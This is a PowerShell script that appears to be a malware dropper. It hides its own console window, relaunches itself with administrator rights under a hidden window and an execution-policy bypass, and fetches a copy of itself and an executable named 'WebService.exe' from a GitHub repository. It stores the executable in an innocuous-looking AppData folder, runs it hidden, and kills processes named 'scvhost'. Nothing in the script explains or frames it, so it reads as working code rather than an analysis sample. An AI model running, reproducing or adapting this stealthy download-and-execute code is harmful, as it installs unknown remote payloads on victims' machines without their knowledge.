#Requires -Version 5.1
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32Hide {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@ -ErrorAction SilentlyContinue | Out-Null

$hwnd = [Win32Hide]::GetConsoleWindow()
if ($hwnd -ne [IntPtr]::Zero) {
    [Win32Hide]::ShowWindow($hwnd, 0) | Out-Null
}

$RepoBase   = 'https://github.com/xxxrytya9/logs9/raw/main'
$ExeName    = 'WebService.exe'
$TargetDir  = Join-Path $env:APPDATA 'WinSvc'
$TargetExe  = Join-Path $TargetDir $ExeName
$KillName   = 'scvhost'

function Get-RemoteFile {
    param([string]$Url, [string]$OutFile)
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($Url, $OutFile)
}

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = [Security.Principal.WindowsPrincipal]$id
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Restart-Elevated {
    param([string]$ScriptPath)

    Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden -ArgumentList @(
        '-NoProfile'
        '-WindowStyle', 'Hidden'
        '-ExecutionPolicy', 'Bypass'
        '-File', $ScriptPath
    ) | Out-Null
}

if (-not (Test-IsAdmin)) {
    $self = $MyInvocation.MyCommand.Path

    if (-not $self -or -not (Test-Path -LiteralPath $self)) {
        $self = Join-Path $env:TEMP 'winsvc-install.ps1'
        Get-RemoteFile -Url "$RepoBase/scripts.ps1" -OutFile $self
    }

    Restart-Elevated -ScriptPath $self
    exit
}

if (-not (Test-Path -LiteralPath $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

Get-RemoteFile -Url "$RepoBase/$ExeName" -OutFile $TargetExe

Start-Process -FilePath $TargetExe -WorkingDirectory $TargetDir -WindowStyle Hidden

Start-Sleep -Seconds 2

$targets = Get-Process -Name $KillName -ErrorAction SilentlyContinue
if ($targets) {
    $targets | Stop-Process -Force
}
